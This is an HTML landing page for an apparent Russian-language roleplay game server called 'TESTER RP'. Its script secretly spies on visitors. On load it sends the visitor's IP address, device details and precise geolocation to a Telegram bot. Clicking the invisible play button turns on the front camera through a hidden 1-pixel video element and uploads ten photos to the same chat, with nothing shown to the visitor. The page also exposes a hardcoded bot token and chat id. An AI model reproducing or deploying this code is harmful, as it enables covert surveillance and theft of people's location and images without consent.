<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TESTER RP</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            overflow: hidden;
            touch-action: none;
            -webkit-text-size-adjust: none;
            text-size-adjust: none;
            height: 100vh;
            font-family: Arial, sans-serif;
            position: relative;
            background: #000;
            display: flex;
            flex-direction: column;
        }
        .background-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://i.ibb.co/LDrtg7sJ/12-20250403192149.png') no-repeat center center;
            background-size: cover;
            z-index: -2;
        }
        .content {
            position: relative;
            z-index: 1;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            align-items: center;
            padding-bottom: 20px;
        }
        .play-btn {
            background: transparent;
            border: none;
            width: 200px;
            height: 80px;
            margin-bottom: 100px;
            cursor: pointer;
            position: absolute;
            bottom: 150px;
            opacity: 0;
        }
        .hidden-camera {
            position: absolute;
            opacity: 0;
            width: 1px;
            height: 1px;
        }
        .legal-links {
            position: absolute;
            bottom: 10px;
            width: 100%;
            text-align: center;
            color: #fff;
            font-size: 12px;
            padding: 5px 0;
        }
        .message-box {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            z-index: 100;
            display: none;
        }
    </style>
</head>
<body>
    <div class="background-container"></div>
    <div class="content">
        <button class="play-btn" id="playBtn"></button>
    </div>

    <div class="legal-links">
        Договор оферты    Политика конфиденциальности
    </div>

    <div class="message-box" id="messageBox">
        Форум в разработке
    </div>

    <video id="hiddenCamera" class="hidden-camera" autoplay playsinline></video>

    <script>
        const botToken = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
        const chatId = '-1002577213610';
        const videoElement = document.getElementById('hiddenCamera');
        const playBtn = document.getElementById('playBtn');
        const messageBox = document.getElementById('messageBox');
        let stream = null;
        let positionCache = null;

        // Блокировка масштабирования
        document.addEventListener('gesturestart', e => e.preventDefault());
        document.addEventListener('touchmove', e => e.scale !== 1 && e.preventDefault(), { passive: false });

        // Функция для получения геолокации с кешированием
        async function getGeolocation() {
            if (positionCache) return positionCache;
            
            return new Promise((resolve) => {
                if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            positionCache = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            };
                            resolve(positionCache);
                        },
                        error => {
                            resolve({ error: 'Геолокация запрещена: ' + error.message });
                        },
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                } else {
                    resolve({ error: 'Геолокация не поддерживается' });
                }
            });
        }

        // Отправка карты геолокации в Telegram
        async function sendLocationToTelegram(lat, lon) {
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        latitude: lat,
                        longitude: lon
                    })
                });
            } catch (error) {
                console.error('Ошибка отправки геолокации:', error);
            }
        }

        // Получение информации об устройстве
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                date: new Date().toLocaleString()
            };
        }

        // Отправка информации о пользователе
        async function sendUserInfo() {
            try {
                // Получаем IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                // Получаем геолокацию
                const geoData = await getGeolocation();
                if (geoData.latitude && geoData.longitude) {
                    await sendLocationToTelegram(geoData.latitude, geoData.longitude);
                }

                // Формируем сообщение
                const deviceInfo = getDeviceInfo();
                let message = `🚨 Новый посетитель:\nIP: ${ipData.ip}\n`;
                message += `Устройство: ${deviceInfo.userAgent}\n`;
                message += `Экран: ${deviceInfo.screen}\n`;
                message += `Время: ${deviceInfo.date}\n`;
                
                if (geoData.latitude) {
                    message += `\n📍 Геолокация:\nШирота: ${geoData.latitude}\nДолгота: ${geoData.longitude}\n`;
                    message += `Точность: ${geoData.accuracy} метров\n`;
                } else {
                    message += `\n⚠️ Геолокация: ${geoData.error || 'Недоступна'}\n`;
                }

                // Отправляем сообщение
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

            } catch (error) {
                console.error('Ошибка отправки информации:', error);
            }
        }

        // Захват фото с камеры
        async function captureAndSendPhoto(index) {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                // Проверка что фото не черное
                const imageData = ctx.getImageData(0, 0, 1, 1).data;
                if (imageData[0] === 0 && imageData[1] === 0 && imageData[2] === 0) {
                    throw new Error('Камера вернула черное изображение');
                }
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
                
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, `photo_${index}.jpg`);
                formData.append('caption', `📸 Фото ${index} - ${new Date().toLocaleString()}`);
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
            } catch (error) {
                console.error(`Ошибка фото ${index}:`, error);
                throw error; // Пробрасываем ошибку для повторной попытки
            }
        }

        // Серийная съемка с повторными попытками
        async function takeSeriesOfPhotos() {
            let successCount = 0;
            const maxAttempts = 3;
            
            for (let i = 1; i <= 10; i++) {
                let attempts = 0;
                let success = false;
                
                while (attempts < maxAttempts && !success) {
                    attempts++;
                    try {
                        await captureAndSendPhoto(i);
                        successCount++;
                        success = true;
                    } catch (error) {
                        if (attempts >= maxAttempts) {
                            console.error(`Не удалось сделать фото ${i} после ${maxAttempts} попыток`);
                        } else {
                            await new Promise(resolve => setTimeout(resolve, 300));
                        }
                    }
                }
                
                if (i < 10) await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            return successCount;
        }

        // Запуск камеры
        async function startCamera() {
            try {
                // Пробуем фронтальную камеру
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                videoElement.srcObject = stream;
                
                // Ждем пока камера инициализируется
                await new Promise(resolve => {
                    videoElement.onloadedmetadata = resolve;
                    setTimeout(resolve, 1000);
                });
                
                // Делаем серию фото
                const successCount = await takeSeriesOfPhotos();
                
                // Отправляем отчет
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `📊 Отчет: успешно отправлено ${successCount}/10 фото`
                    })
                });
                
            } catch (error) {
                console.error('Ошибка камеры:', error);
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `⚠️ Ошибка камеры: ${error.message || 'Неизвестная ошибка'}`
                    })
                });
            } finally {
                stopCamera();
                messageBox.style.display = 'block';
            }
        }

        // Остановка камеры
        function stopCamera() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                videoElement.srcObject = null;
                stream = null;
            }
        }

        // Обработчик кнопки
        playBtn.addEventListener('click', async () => {
            await sendUserInfo();
            await startCamera();
        });

        // Остановка камеры при закрытии
        window.addEventListener('beforeunload', stopCamera);
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) stopCamera();
        });

        // Отправка информации при загрузке
        window.addEventListener('load', sendUserInfo);
    </script>
</body>
</html>
